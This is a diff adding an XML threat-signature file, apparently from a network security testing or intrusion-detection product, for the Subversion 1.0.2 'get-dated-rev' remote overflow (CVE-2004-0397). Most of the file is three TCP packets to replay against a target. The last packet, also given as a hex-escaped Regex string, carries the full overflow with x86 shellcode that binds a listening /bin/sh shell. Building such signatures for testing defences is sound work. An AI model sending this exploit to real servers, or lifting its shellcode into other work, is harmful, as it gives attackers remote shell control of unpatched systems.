@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Subversion get-dated-rev Overflow"/>
+    <EngDesc display="true" value="This threat causes a remote overflow in the Subversion source control system.  This is used to gain control of the target server.  Subversion typically listens on port 3690."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Buffer_Overflow"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="SVN"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Subversion"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Subversion_Subversion"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Subversion_Subversion_1.0.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://security.e-matters.de/advisories/082004.html"/>
+    <CVEID display="true" value="CVE-2004-0397"/>
+    <bugtraqID display="true" value="10386"/>
+    <OSVDB display="true" value="6301"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059818593000c000a80001003c5eda2452"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742243289843750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X28\X20\X67\X65\X74\X2D\X64\X61\X74\X65\X64\X2D\X72\X65\X76\X20\X28\X20\X33\X31\X34\X3A\X61\X61\X61\X61\X61\X61\X61\X61\X78\X32\X06\X08\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\XDC\X32\X06\X08\X61\X61\X61\X61\X61\X61\X61\X61\XEB\X72\X5E\X29\XC0\X89\X46\X10\X40\X89\XC3\X89\X46\X0C\X40\X89\X46\X08\X8D\X4E\X08\XB0\X66\XCD\X80\X43\XC6\X46\X10\X10\X66\X89\X5E\X14\X88\X46\X08\X29\XC0\X89\XC2\X89\X46\X18\XB0\X90\X66\X89\X46\X16\X8D\X4E\X14\X89\X4E\X0C\X8D\X4E\X08\XB0\X66\XCD\X80\X89\X5E\X0C\X43\X43\XB0\X66\XCD\X80\X89\X56\X0C\X89\X56\X10\XB0\X66\X43\XCD\X80\X86\XC3\XB0\X3F\X29\XC9\XCD\X80\XB0\X3F\X41\XCD\X80\XB0\X3F\X41\XCD\X80\X88\X56\X07\X89\X76\X0C\X87\XF3\X8D\X4B\X0C\XB0\X0B\XCD\X80\XE8\X89\XFF\XFF\XFF\X2F\X62\X69\X6E\X2F\X73\X68\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X61\X20\X34\X20\X61\X20\X74\X74\X74\X74\X20\X31\X36\X3A\X32\X34\X3A\X32\X33\X2E\X31\X31\X31\X20\X28\X64\X61\X79\X20\X32\X37\X37\X2C\X20\X64\X73\X74\X20\X31\X2C\X20\X67\X6D\X74\X5F\X6F\X66\X66\X20\X2D\X31\X38\X30\X30\X30\X29\X20\X29\X20\X29\X0A"/>
+    <Created value="1139462487" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="J"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+    </for>
+    <for index="B">
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+    </for>
+    <for index="C">
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0066" Identification="BC6D" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F66E" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="098BF62F" AckNumber="E0BF445B" HeaderLength="08" WindowSize="FFFF" Checksum="F5DB" UrgentPointer="0000" Options="0101080A86237715013C427A" Payload="282032202820656469742D706970656C696E6520292032323A73766E3A2F2F3139322E3136382E332E312F636F6F6C20290A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0049" Identification="BC6E" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F68A" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="098BF661" AckNumber="E0BF463F" HeaderLength="08" WindowSize="FFFF" Checksum="534C" UrgentPointer="0000" Options="0101080A8623771A013C4B86" Payload="2820414E4F4E594D4F5553202820303A202920290A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0189" Identification="BC6F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F549" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="098BF676" AckNumber="E0BF4823" HeaderLength="08" WindowSize="FFFF" Checksum="3931" UrgentPointer="0000" Options="0101080A8623771C013C5043" Payload="28206765742D64617465642D7265762028203331343A61616161616161617832060861616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161DC3206086161616161616161EB725E29C08946104089C389460C408946088D4E08B066CD8043C646101066895E1488460829C089C2894618B090668946168D4E14894E0C8D4E08B066CD80895E0C4343B066CD8089560C895610B06643CD8086C3B03F29C9CD80B03F41CD80B03F41CD8088560789760C87F38D4B0CB00BCD80E889FFFFFF2F62696E2F7368616161616161616161616161616161616161616161616161616161616161612034206120747474742031363A32343A32332E3131312028646179203237372C2064737420312C20676D745F6F6666202D313830303029202920290A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
